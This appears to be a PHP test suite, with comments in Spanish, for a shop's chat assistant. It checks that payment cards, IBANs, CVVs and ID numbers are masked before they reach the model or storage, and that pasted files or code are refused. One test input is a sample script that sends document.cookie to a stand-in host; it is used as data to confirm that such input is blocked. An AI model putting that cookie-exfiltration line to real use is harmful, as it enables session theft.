<?php
/**
 * AIFEC — pruebas de lo que el asistente NO deja pasar: los datos de pago que un cliente escribe en el chat (tarjeta, IBAN,
 * código de seguridad) y los ficheros o trozos de código pegados.
 *
 * Nace de una revisión de seguridad que pasó el usuario el 13/11/2026: «el bot respondió "he tomado nota de tus datos" cuando
 * probé con un DNI y una tarjeta: ¿los guarda?» y «he pasado mucho texto sin sentido, código, PDF… no sé si eso llegaba al modelo».
 *
 * @author    Ecom Experts <ecomyseo@gmail.com>
 * @copyright 2026 Ecom Experts
 * @license   Ver LICENSE.md
 */

declare(strict_types=1);

use Aifec\Kernel\Request;
use Aifec\Modules\Assistant\Masker;
use Aifec\Modules\Assistant\Noise;

require_once __DIR__ . '/FastKit.php';

test('una tarjeta se tapa entera salvo sus cuatro últimas cifras, se escriba junta, con espacios o con guiones', function (): void {
    $found = null;
    same('***1111', Masker::secrets('4111 1111 1111 1111', $found));
    same(true, $found);
    same('mi visa ***1111, gracias', Masker::secrets('mi visa 4111-1111-1111-1111, gracias'));
    same('***4444', Masker::secrets('5555555555554444'), 'Mastercard');
    same('***0005', Masker::secrets('3782 822463 10005'), 'American Express, 15 cifras');
    same('***5904', Masker::secrets('3056 930902 5904'), 'Diners, 14 cifras');
});

test('con la tarjeta se tapan la caducidad y el código de seguridad que venían en el mismo mensaje', function (): void {
    $out = Masker::secrets('Mi tarjeta es 4111 1111 1111 1111 caduca 12/27 y el CVV 123');

    same('Mi tarjeta es ***1111 caduca **/** y el CVV ***', $out);
    same('***1111 **/** ***', Masker::secrets('4111111111111111 12/2027 ***'));
    same('código de seguridad: ***', Masker::secrets('código de seguridad: 9876'), 'el código solo, si se dice que lo es');
});

test('un IBAN se tapa si su largo y su resto cuadran; lo que viene detrás se queda', function (): void {
    $found = null;
    same('mi cuenta es ***1332 gracias por todo', Masker::secrets('mi cuenta es ES91 2100 0418 4502 0005 1332 gracias por todo', $found));
    same(true, $found);
    same('***1332', Masker::secrets('ES9121000418450200051332'));
    same('***3000', Masker::secrets('DE89 3704 0044 0532 0130 00'), 'un IBAN alemán');
});

test('lo que no es un dato de pago se queda como está: códigos de barras, teléfonos, referencias, precios y números que no cuadran', function (): void {
    $same = [
        'busco el 8410076472106',
        'mi teléfono es 999 000 001',
        'el pedido PED-2026-000123 no ha llegado',
        'un 4111 1111 1111 1112 no es una tarjeta',
        'tornillos de 12/27 y tuercas',
        'son 1.234,56 € en total',
        'ES12 3456 no es una cuenta',
        'ES91 2100 0418 4502 0005 1333 tiene mal el control',
        'la referencia 9999 8888 7777 6666 del proveedor',
        'quiero 2 sillas rojas',
    ];
    foreach ($same as $text) {
        $found = null;
        same($text, Masker::secrets($text, $found));
        same(false, $found, $text);
    }
});

test('con IA: la tarjeta no llega al modelo ni se guarda, el DNI se guarda tapado y la tienda avisa con su frase', function (): void {
    [$app, $ai, $web] = fastChatShop();
    $ai->script(assistantText('Dime en qué te ayudo.'));

    $r = assistantSay($web, 'Mi DNI es 12345678Z y mi tarjeta 4111 1111 1111 1111 caduca 12/27 cvv 123');

    contains('Por tu seguridad he quitado de tu mensaje los datos de la tarjeta o del banco', $r['text']);
    contains('Dime en qué te ayudo.', $r['text'], 'detrás, lo que contesta el asistente');
    $sent = print_r($ai->asked, true);
    notContains('4111 1111 1111 1111', $sent, 'el modelo no ve la tarjeta');
    notContains('4111111111111111', $sent);
    notContains('cvv 123', $sent, 'ni el código');
    notContains('12/27', $sent, 'ni la caducidad');
    contains('***1111', $sent, 've que había una, tapada');
    contains('The customer wrote payment card or bank details', $sent, 'y se le dice que no hable de ella');
    $rows = assistantRows($app, 'conversation_messages');
    $all = implode("\n", array_column($rows, 'content'));
    notContains('4111', str_replace('***1111', '', $all), 'la conversación guardada no tiene la tarjeta');
    notContains('12345678Z', $all, 'ni el DNI entero');
    contains('***78Z', $all, 'el DNI queda con sus tres últimos caracteres');
    contains('Por tu seguridad', $all, 'el aviso también queda en la conversación');
});

test('por reglas (sin IA) el aviso sale igual y la tarjeta tampoco se guarda', function (): void {
    [$app, $ai, $web] = fastChatShop();
    $ai->on = false;

    $r = assistantSay($web, 'apunta mi tarjeta 5555 5555 5555 4444 y mi cuenta ES91 2100 0418 4502 0005 1332');

    contains('Por tu seguridad he quitado de tu mensaje', $r['text']);
    $all = implode("\n", array_column(assistantRows($app, 'conversation_messages'), 'content'));
    notContains('5555 5555 5555 4444', $all);
    notContains('2100 0418', $all);
});

test('un mensaje normal no lleva aviso', function (): void {
    [, $ai, $web] = fastChatShop();
    $ai->script(assistantText('Tenemos varias.'));

    $r = assistantSay($web, 'busco una silla roja para el salón');

    notContains('Por tu seguridad', $r['text']);
});

test('un fichero o un trozo de código pegado no se le pregunta al modelo, no se busca y no se guarda entero', function (): void {
    [$app, $ai, $web] = fastChatShop();
    $pdf = '%PDF-1.7 1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj 2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj ' . str_repeat('xœ+T0P0´0V0Ð³4U04', 20);

    $r = assistantSay($web, $pdf);

    contains('Eso no parece una pregunta para la tienda', $r['text']);
    same([], $r['cards'], 'no se ha buscado nada');
    same(0, count($ai->asked), 'no se le ha preguntado al modelo');
    $saved = assistantRows($app, 'conversation_messages', "role = 'user'")[0]['content'];
    same(true, mb_strlen($saved, 'UTF-8') <= 121, 'solo se guarda el principio');

    $code = 'function hack(){ var a = document.cookie; fetch("https://x.test/?c=" + a).then(function(r){ return r.json(); }); if (a == null && b != 1) { console.log("x"); } } hack(); SELECT * FROM users;';
    $r = assistantSay($web, $code);
    contains('Eso no parece una pregunta para la tienda', $r['text']);
    same(0, count($ai->asked));
});

test('una frase larga de un cliente, una dirección web larga o un mensaje con medidas siguen su camino', function (): void {
    $fine = [
        'Hola, buenas tardes. Estoy buscando una silla de oficina para mi padre, que tiene problemas de espalda y pasa muchas horas sentado; me gustaría que fuera cómoda, con reposabrazos y a ser posible de color oscuro. ¿Qué me recomendáis que no pase de 200 euros?',
        'He visto este producto en vuestra web y no sé si es el mismo: https://tienda.test/producto/silla-ergonomica-de-oficina-con-reposabrazos-ajustables-y-respaldo-de-malla-transpirable-negra ¿me lo confirmáis? Gracias de antemano por la ayuda.',
        'Necesito 12 tornillos de 4x40, 8 tacos del 6, 2 escuadras de 30x30 y un tablero de 120x60x1,8 cm. ¿Lo tenéis todo? Mi código postal es el 28013 y lo querría para el viernes si puede ser.',
        'busco una silla',
    ];
    foreach ($fine as $text) {
        same(false, Noise::looks($text), mb_substr($text, 0, 40, 'UTF-8'));
    }
    same(true, Noise::looks('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk'));
    same(true, Noise::looks(str_repeat('{}[]();<>=+-*/%$#@!', 12)), 'una ristra de símbolos');
    same(true, Noise::looks('aqui va ' . str_repeat('QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo', 4) . ' pegado sin querer en el chat de la tienda, perdona'), 'base64 en medio');
});

test('quien manda JSON recibe sus errores en JSON aunque no diga qué acepta; un enlace «.json» abierto por un navegador, no', function (): void {
    $json = new Request('POST', '/asistente/mensaje', [], [], [], ['content-type' => 'application/json; charset=utf-8'], '{}');
    same(true, $json->wantsJson());
    $path = new Request('GET', '/mi-cuenta/privacidad/datos.json');
    same(false, $path->wantsJson(), 'sin sesión tiene que llevar a entrar, no contestar un 401 en JSON');
    $form = new Request('POST', '/contacto', [], ['a' => 'b'], [], ['content-type' => 'application/x-www-form-urlencoded']);
    same(false, $form->wantsJson(), 'un formulario de una página sigue recibiendo una página');
    $page = new Request('GET', '/producto/silla', [], [], [], ['accept' => 'text/html']);
    same(false, $page->wantsJson());
});
